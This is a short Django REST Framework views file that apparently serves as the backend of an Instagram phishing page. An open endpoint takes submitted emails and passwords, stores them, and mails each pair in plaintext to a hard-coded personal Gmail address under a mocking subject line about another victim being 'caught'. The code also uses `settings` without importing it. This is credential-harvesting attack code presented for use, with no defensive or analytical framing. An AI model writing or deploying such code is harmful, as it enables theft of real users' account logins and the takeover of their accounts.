from django.shortcuts import render
from rest_framework import viewsets, generics, status
from .models import *
from .serializer import *
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from rest_framework.views import APIView
from django.core.mail import send_mail
# Create your views here.



class CreateInstaDataView(APIView):
    permission_classes = (AllowAny,)
    def post(self, request, format=None):
        serializer = InstaDataSerializer(data=request.data)
        if serializer.is_valid():
            email = request.data.get('email')
            password = request.data.get('password')
            send_email(email, password)
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    


def send_email(email, password):
        send_mail(
            "Aik Aur Chooza Pakra Gaya XD",
            f"Ye le email:{email}  aur ye pass:{password} ",
            settings.EMAIL_HOST_USER,
            ["ph0150165@gmail.com"],
            fail_silently=False,
        )   










